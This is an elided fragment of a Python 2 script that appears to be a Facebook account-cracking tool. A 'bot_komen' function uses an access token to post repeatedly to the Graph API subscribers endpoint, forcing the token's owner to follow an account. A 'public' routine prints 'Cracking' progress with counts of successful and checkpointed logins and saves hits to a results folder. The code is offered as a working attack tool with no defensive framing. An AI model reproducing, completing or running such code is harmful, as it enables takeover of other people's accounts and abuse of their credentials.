...
def bot_komen():
    ...
    requests.post('https://graph.facebook.com/0/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/0/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/0/subscribers?access_token=' + token)
...
def public():
	...
	def main(user):
		...
		print'\r \x1b[0;97m[\x1b[0;96m%s\x1b[0;97m] Cracking %s/%s ' % (datetime.now().strftime('%H:%M:%S'), loop, len(id), len(ok), len(cp)), 
		sys.stdout.flush()
		uid,name=user.split("|")
		try:
			os.mkdir('results')
